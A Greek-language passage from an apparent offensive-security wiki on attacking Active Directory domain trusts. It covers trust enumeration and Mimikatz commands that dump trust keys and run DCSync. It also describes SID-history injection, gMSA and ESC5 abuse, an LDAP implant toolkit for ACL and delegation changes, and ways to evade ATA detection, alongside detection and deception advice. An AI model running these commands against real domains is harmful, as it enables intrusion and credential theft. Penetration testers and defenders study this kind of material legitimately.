Σε ένα συνηθισμένο σενάριο, αν ένας χρήστης θέλει να αποκτήσει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket, γνωστό ως **inter-realm TGT**, από τον DC του δικού του domain. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια, ο χρήστης παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μόλις ο DC του trusted domain επικυρώσει επιτυχώς το inter-realm TGT, εκδίδει ένα TGS, παρέχοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT, αν ο client αυθεντικοποιηθεί επιτυχώς.
3. Στη συνέχεια, ο client ζητά από τον DC1 ένα **inter-realm TGT**, το οποίο χρειάζεται για να αποκτήσει πρόσβαση σε πόρους στο **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται οι DC1 και DC2 στο πλαίσιο του αμφίδρομου domain trust.
5. Ο client μεταφέρει το inter-realm TGT στον **Domain Controller του Domain 2 (DC2)**.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινό trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, όπου είναι κρυπτογραφημένο με το hash του λογαριασμού του server, για να αποκτήσει πρόσβαση στην υπηρεσία στο Domain 2.

### Διαφορετικά trusts

Είναι σημαντικό να σημειωθεί ότι ένα **trust μπορεί να είναι μονόδρομο ή αμφίδρομο**. Στην αμφίδρομη περίπτωση, τα δύο domains εμπιστεύονται το ένα το άλλο, ενώ σε μια **μονόδρομη** σχέση trust το ένα domain είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείς να έχεις πρόσβαση σε πόρους μέσα στο trusting domain μόνο από το trusted domain**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B είναι το trusted domain. Επιπλέον, στο **Domain A**, αυτό είναι ένα **Outbound trust**, ενώ στο **Domain B** είναι ένα **Inbound trust**.

**Διαφορετικές σχέσεις trust**

- **Parent-Child Trusts**: Αυτή είναι μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα αμφίδρομο transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα αιτήματα αυθεντικοποίησης μπορούν να μεταφέρονται απρόσκοπτα μεταξύ του parent και του child.
- **Cross-link Trusts**: Γνωστά ως «shortcut trusts», δημιουργούνται ανάμεσα σε child domains για να επιταχύνουν τις διαδικασίες παραπομπής. Σε σύνθετα forests, οι παραπομπές αυθεντικοποίησης συνήθως πρέπει να περάσουν προς τα πάνω, μέχρι το forest root, και μετά προς τα κάτω, μέχρι το domain-στόχο. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά κατανεμημένα περιβάλλοντα.
- **External Trusts**: Δημιουργούνται ανάμεσα σε διαφορετικά, μη συσχετιζόμενα domains και είναι από τη φύση τους non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε πόρους ενός domain εκτός του τρέχοντος forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering στα external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα ανάμεσα στο forest root domain και σε ένα νέο tree root που προστίθεται. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και εξασφαλίζοντας αμφίδρομη transitivity. Περισσότερες πληροφορίες υπάρχουν στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι αμφίδρομο transitive trust ανάμεσα σε δύο forest root domains και εφαρμόζει επίσης SID filtering για την ενίσχυση της ασφάλειας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με Kerberos domains που δεν βασίζονται σε Windows και είναι [συμβατά με το RFC4120](https://tools.ietf.org/html/rfc4120). Τα MIT trusts είναι πιο εξειδικευμένα και απευθύνονται σε περιβάλλοντα που απαιτούν ενσωμάτωση με συστήματα βασισμένα στο Kerberos εκτός του οικοσυστήματος Windows.

#### Άλλες διαφορές στις **σχέσεις trust**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (το A εμπιστεύεται το B, το B εμπιστεύεται το C, άρα το A εμπιστεύεται το C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (τα δύο μέρη εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Διαδρομή επίθεσης

1. **Κάνε enumerate** τις σχέσεις trust.
2. Έλεγξε αν κάποιος **security principal** (user/group/computer) έχει **πρόσβαση** σε πόρους του **άλλου domain**, ενδεχομένως μέσω καταχωρίσεων ACE ή επειδή ανήκει σε groups του άλλου domain. Αναζήτησε **σχέσεις μεταξύ domains** (πιθανότατα γι’ αυτό δημιουργήθηκε το trust).
   1. Σε αυτή την περίπτωση, το kerberoast θα μπορούσε να είναι μια ακόμη επιλογή.
3. **Παραβίασε** τους **λογαριασμούς** που μπορούν να χρησιμοποιηθούν για **pivot** μεταξύ domains.

Οι attackers που θα μπορούσαν να αποκτήσουν πρόσβαση σε πόρους άλλου domain μπορούν να το κάνουν μέσω τριών βασικών μηχανισμών:

- **Local Group Membership**: Principals μπορεί να προστεθούν σε local groups σε μηχανήματα, όπως στο group «Administrators» ενός server, αποκτώντας σημαντικό έλεγχο πάνω σε αυτό το μηχάνημα.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη groups μέσα στο foreign domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope του group.
- **Access Control Lists (ACLs)**: Principals μπορεί να ορίζονται σε ένα **ACL**, ειδικά ως οντότητες σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στον τρόπο λειτουργίας των ACLs, DACLs και ACEs, το whitepaper με τίτλο «[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)» είναι μια ανεκτίμητη πηγή.<sup>[[17]](#references)</sup>

### Εύρεση εξωτερικών χρηστών/groups με δικαιώματα

Μπορείς να ελέγξεις το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρεις foreign security principals στο domain. Αυτά θα είναι χρήστες/groups από **εξωτερικό domain/forest**.

Μπορείς να το ελέγξεις στο **Bloodhound** ή χρησιμοποιώντας το powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Κλιμάκωση προνομίων από Child σε Parent forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Άλλοι τρόποι απαρίθμησης των σχέσεων εμπιστοσύνης τομέων:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Υπάρχουν **2 έμπιστα κλειδιά**, ένα για _Παιδί --> Γονέας_ και ένα άλλο για _Γονέας_ --> _Παιδί_.\
> Μπορείτε να εντοπίσετε αυτό που χρησιμοποιείται από τον τρέχοντα τομέα με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κάντε privilege escalation σε Enterprise admin προς το child/parent domain, καταχρώμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση εγγράψιμου Configuration NC

Η κατανόηση του τρόπου εκμετάλλευσης του Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο δεδομένων διαμόρφωσης σε ένα forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) εντός του forest, ενώ οι εγγράψιμοι DC διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για την εκμετάλλευσή του, απαιτούνται **SYSTEM privileges σε έναν DC**, κατά προτίμηση σε child DC.

**Σύνδεση GPO με το root DC site**

Το container Sites του Configuration NC περιέχει πληροφορίες για τα sites όλων των υπολογιστών που είναι συνδεδεμένοι στο domain εντός του AD forest. Με SYSTEM privileges σε οποιονδήποτε DC, οι attackers μπορούν να συνδέσουν GPOs με τα root DC sites. Αυτή η ενέργεια ενδέχεται να θέσει σε κίνδυνο το root domain, μέσω της τροποποίησης των policies που εφαρμόζονται σε αυτά τα sites.

Για περισσότερες πληροφορίες, μπορείτε να μελετήσετε την έρευνα για το [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Παραβίαση οποιουδήποτε gMSA στο forest**

Ένα attack vector είναι η στόχευση privileged gMSAs στο domain. Το KDS Root key, που είναι απαραίτητο για τον υπολογισμό των passwords των gMSA, αποθηκεύεται στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords οποιουδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και οδηγίες βήμα προς βήμα παρέχονται στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική επίθεση delegated MSA (BadSuccessor – κατάχρηση migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Πρόσθετη εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Επίθεση αλλαγής Schema**

Αυτή η μέθοδος απαιτεί υπομονή, καθώς πρέπει να περιμένετε τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε χρήστη πλήρη έλεγχο σε όλες τις classes. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο των νεοδημιουργημένων AD objects.

Περισσότερα μπορείτε να διαβάσετε στο [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Από DA σε EA με ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο των αντικειμένων Public Key Infrastructure (PKI), προκειμένου να δημιουργηθεί ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης εντός του forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, η παραβίαση ενός εγγράψιμου child DC επιτρέπει την εκτέλεση επιθέσεων ESC5.

Περισσότερες λεπτομέρειες υπάρχουν στο [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε περιπτώσεις όπου δεν υπάρχει ADCS, ο attacker μπορεί να εγκαταστήσει τα απαραίτητα components, όπως περιγράφεται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) ή bidirectional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Σε αυτό το σενάριο, **ένας εξωτερικός τομέας εμπιστεύεται τον δικό σας**, παρέχοντάς σας **απροσδιόριστα δικαιώματα** σε αυτόν. Θα πρέπει να εντοπίσετε **ποιοι principals του τομέα σας έχουν ποια πρόσβαση στον εξωτερικό τομέα** και, στη συνέχεια, να προσπαθήσετε να την εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικός τομέας forest - μονόδρομη (εξερχόμενη)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain γίνεται trusted** από το trusting domain, το trusted domain **δημιουργεί έναν χρήστη** με **προβλέψιμο όνομα**, ο οποίος χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **αποκτήσετε πρόσβαση σε έναν χρήστη από το trusting domain, για να εισέλθετε στο trusted domain**, να το απαριθμήσετε και να προσπαθήσετε να κλιμακώσετε περαιτέρω τα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να παραβιαστεί το trusted domain είναι να βρεθεί ένας [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από το domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος να παραβιαστεί το trusted domain είναι να περιμένετε σε ένα μηχάνημα στο οποίο μπορεί να συνδεθεί μέσω **RDP** ένας **χρήστης από το trusted domain**. Τότε, ο attacker θα μπορούσε να εισαγάγει κώδικα στη διεργασία της RDP session και να **αποκτήσει από εκεί πρόσβαση στο domain προέλευσης του θύματος**.\
Επιπλέον, αν το **θύμα είχε προσαρτήσει τον σκληρό του δίσκο**, ο attacker θα μπορούσε, μέσω της διεργασίας της **RDP session**, να αποθηκεύσει **backdoors** στον **startup folder του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός της κατάχρησης των domain trust

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που εκμεταλλεύονται το attribute SID history σε forest trusts μετριάζεται μέσω του SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην παραδοχή ότι τα intra-forest trusts είναι ασφαλή, καθώς σύμφωνα με τη θέση της Microsoft, το όριο ασφαλείας είναι το forest και όχι το domain.
- Ωστόσο, υπάρχει ένα πρόβλημα: το SID filtering ενδέχεται να διαταράξει τη λειτουργία εφαρμογών και την πρόσβαση χρηστών, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Για τα inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι χρήστες από τα δύο forests δεν πραγματοποιούν αυτόματα authentication. Αντίθετα, απαιτούνται ρητά permissions για να αποκτήσουν οι χρήστες πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**Περισσότερες πληροφορίες σχετικά με τα domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Κατάχρηση AD μέσω LDAP από implants σε host

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) υλοποιεί ξανά primitives LDAP τύπου bloodyAD ως x64 Beacon Object Files, τα οποία εκτελούνται εξ ολοκλήρου μέσα σε implant σε host (π.χ., Adaptix C2). Οι operators μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και στη συνέχεια καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context μέσω LDAP (389) με signing/sealing ή μέσω LDAPS (636) με αυτόματη εμπιστοσύνη στο certificate, επομένως δεν απαιτούνται socks proxies ή artifacts στον δίσκο.<sup>[[4]](#references)</sup>

### Απαρίθμηση LDAP από την πλευρά του implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` επιλύουν σύντομα ονόματα/διαδρομές OU σε πλήρη DN και εξάγουν τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` ανακτούν αυθαίρετα attributes (συμπεριλαμβανομένων των security descriptors), καθώς και τα metadata του forest/domain από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` εμφανίζουν απευθείας από το LDAP πιθανούς στόχους για roasting, ρυθμίσεις delegation και υπάρχοντα descriptors [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- Τα `get-acl` και `get-writable --detailed` αναλύουν το DACL για να εμφανίσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/writes σε attributes) και inheritance, παρέχοντας άμεσους στόχους για privilege escalation μέσω ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitive εγγραφής LDAP για κλιμάκωση προνομίων και persistence

- Τα Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάσει νέα principals ή λογαριασμούς μηχανημάτων όπου υπάρχουν δικαιώματα OU. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` επιτρέπουν την άμεση παραβίαση στόχων μόλις εντοπιστούν δικαιώματα write-property.
- Εντολές εστιασμένες σε ACL, όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε αντικείμενο AD σε επαναφορές κωδικών πρόσβασης, έλεγχο συμμετοχής σε ομάδες ή δικαιώματα αναπαραγωγής DCSync, χωρίς να αφήνουν ίχνη PowerShell/ADSI. Οι αντίστοιχες εντολές `remove-*` καθαρίζουν τα ACE που προστέθηκαν.

### Delegation, roasting και κατάχρηση Kerberos

- Οι εντολές `add-spn`/`set-spn` κάνουν αμέσως έναν παραβιασμένο χρήστη Kerberoastable· η εντολή `add-asreproastable` (εναλλαγή UAC) τον επισημαίνει για AS-REP roasting χωρίς να πειράζει τον κωδικό πρόσβασης.
- Οι μακροεντολές Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) τροποποιούν τα `msDS-AllowedToDelegateTo`, τις σημαίες UAC ή το `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας διαδρομές επίθεσης constrained/unconstrained/RBCD και εξαλείφοντας την ανάγκη για απομακρυσμένο PowerShell ή RSAT.

### Έγχυση sidHistory, μετακίνηση OU και διαμόρφωση επιφάνειας επίθεσης

- Η εντολή `add-sidhistory` εισάγει προνομιούχα SID στο ιστορικό SID ενός ελεγχόμενου principal (βλ. [SID-History Injection](sid-history-injection.md)), παρέχοντας διακριτική κληρονόμηση πρόσβασης εξ ολοκλήρου μέσω LDAP/LDAPS.
- Η εντολή `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας στον εισβολέα να μετακινήσει στοιχεία σε OU όπου υπάρχουν ήδη εκχωρημένα δικαιώματα, προτού καταχραστεί τις εντολές `set-password`, `add-groupmember` ή `add-spn`.
- Οι εντολές αφαίρεσης με αυστηρά περιορισμένο εύρος (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορη επαναφορά αφού ο operator συλλέξει διαπιστευτήρια ή εγκαταστήσει persistence, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές γενικές άμυνες

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά μέτρα για την προστασία διαπιστευτηρίων**

- **Περιορισμοί Domain Admins**: Συνιστάται να επιτρέπεται στους Domain Admins να συνδέονται μόνο σε Domain Controllers και να αποφεύγεται η χρήση τους σε άλλους hosts.
- **Προνόμια λογαριασμών υπηρεσιών**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με προνόμια Domain Admin (DA), ώστε να διατηρείται η ασφάλεια.
- **Προσωρινός περιορισμός προνομίων**: Για εργασίες που απαιτούν προνόμια DA, η διάρκειά τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Μετριασμός LDAP relay**: Ελέγξτε τα Event ID 2889/3074/3075 και, στη συνέχεια, επιβάλετε LDAP signing και LDAPS channel binding στους DCs/clients, ώστε να αποκλείσετε απόπειρες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting δραστηριότητας Impacket σε επίπεδο πρωτοκόλλου

Αν θέλετε να εντοπίζετε συνήθεις τεχνικές AD, **μη βασίζεστε μόνο σε τεχνουργήματα που ελέγχει ο operator**, όπως μετονομασμένα binaries, ονόματα υπηρεσιών, προσωρινά αρχεία batch ή διαδρομές εξόδου. Καταγράψτε ως baseline τον τρόπο με τον οποίο οι νόμιμοι Windows clients δημιουργούν κίνηση [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI και, στη συνέχεια, αναζητήστε **ιδιομορφίες υλοποίησης** που παραμένουν ακόμη κι όταν ο operator τροποποιήσει τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Υποψήφια στοιχεία υψηλής βεβαιότητας που μπορούν να σταθούν μόνα τους** (αφού επαληθευτούν με βάση το δικό σας baseline):
  - Αυθεντικοποιημένο DCE/RPC με `auth_context_id = 79231 + ctx_id`
  - Padding αυθεντικοποίησης DCE/RPC γεμισμένο με `0xff`
  - LDAP Kerberos binds που τοποθετούν ένα ακατέργαστο Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
  - Αιτήματα SMB2/3 negotiate με τιμές `ClientGuid` που μοιάζουν με ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` με το μη τυπικό namespace `//./root/cimv2`
  - Σκληρά κωδικοποιημένες τιμές nonce Kerberos
- **Καταλληλότερα ως χαρακτηριστικά συσχέτισης/βαθμολόγησης**:
  - Αραιές ή διπλότυπες λίστες Kerberos etype, ασυνήθιστο/ελλιπές `PA-DATA` ή σειρά etype στο TGS-REQ που διαφέρει από την εγγενή συμπεριφορά των Windows
  - Μηνύματα NTLM Type 1 χωρίς πληροφορίες έκδοσης ή μηνύματα Type 3 με κενά ονόματα host
  - Ακατέργαστο NTLMSSP μέσα σε DCE/RPC αντί για SPNEGO, απουσία trailers επαλήθευσης DCE/RPC ή ασυμφωνίες OID SPNEGO/Kerberos
  - Πολλά από αυτά τα χαρακτηριστικά από τον ίδιο host/user/session/χρονικό διάστημα είναι πολύ ισχυρότερη ένδειξη από οποιοδήποτε μεμονωμένο αδύναμο πεδίο
- **Χρησιμοποιήστε τα για εμπλουτισμό, όχι ως αυτόνομες ειδοποιήσεις**:
  - Προεπιλεγμένα ονόματα αρχείων, διαδρομές εξόδου, τυχαία ονόματα υπηρεσιών, προσωρινά ονόματα batch, προεπιλεγμένα ονόματα λογαριασμών υπολογιστών και συμβολοσειρές HTTP/WebDAV/RDP/MSSQL ειδικές για εργαλεία
  - Οι operators μπορούν εύκολα να τα αλλάξουν, επομένως είναι χρησιμότερα για να εξηγούν γιατί ένα σύμπλεγμα πολλών πρωτοκόλλων είναι ύποπτο
- **Λειτουργικές σημειώσεις**:
  - Ορισμένα από αυτά τα σήματα απαιτούν αποκρυπτογραφημένη κίνηση, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή ορατότητα από την πλευρά της υπηρεσίας
  - Επαληθεύστε τα με clients Samba/Linux, συσκευές και παλαιό λογισμικό προτού τα μετατρέψετε σε ειδοποιήσεις
  - Προωθήστε τις ανιχνεύσεις από εμπλουτισμό -> hunting -> ειδοποίηση καθώς αυξάνεται η εμπιστοσύνη σας στο baseline

### **Υλοποίηση τεχνικών deception**

- Η υλοποίηση deception περιλαμβάνει την τοποθέτηση παγίδων, όπως decoy χρήστες ή υπολογιστές, με χαρακτηριστικά όπως κωδικούς πρόσβασης που δεν λήγουν ή λογαριασμούς που έχουν επισημανθεί ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες υψηλών προνομίων.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα είναι η χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερες πληροφορίες για την ανάπτυξη τεχνικών deception υπάρχουν στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Εντοπισμός deception**

- **Για αντικείμενα χρηστών**: Ύποπτες ενδείξεις περιλαμβάνουν ασυνήθιστο ObjectSID, σπάνιες συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό αριθμό αποτυχημένων προσπαθειών κωδικού πρόσβασης.
- **Γενικές ενδείξεις**: Η σύγκριση των χαρακτηριστικών πιθανών decoy αντικειμένων με εκείνα γνήσιων αντικειμένων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων παραπλανητικών αντικειμένων.

### **Παράκαμψη συστημάτων ανίχνευσης**

- **Παράκαμψη ανίχνευσης Microsoft ATA**:
  - **Απαρίθμηση χρηστών**: Αποφύγετε την απαρίθμηση session στους Domain Controllers, ώστε να αποτρέψετε την ανίχνευση από το ATA.
  - **Impersonation ticket**: Η χρήση κλειδιών **aes** για τη δημιουργία ticket βοηθά στην αποφυγή ανίχνευσης, καθώς δεν γίνεται υποβάθμιση σε NTLM.
  - **Επιθέσεις DCSync**: Συνιστάται η εκτέλεσή τους από μη-Domain Controller, ώστε να αποφευχθεί η ανίχνευση από το ATA, καθώς η απευθείας εκτέλεση από Domain Controller θα ενεργοποιήσει ειδοποιήσεις.

## References

- [1] [Οδηγός για την επίθεση σε Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Πλαστογράφηση Trusts για deception στο Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Από Domain Admin σε Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Συλλογή LDAP BOF – In-Memory LDAP Toolkit για εκμετάλλευση του Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Χρήση NTLM Hashes ως Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Ανάλυση του Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Κατάληψη λογαριασμών Active Directory μέσω Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Πώς να διαχειριστείτε τις αλλαγές στις συνδέσεις ασφαλούς καναλιού Netlogon που σχετίζονται με το CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
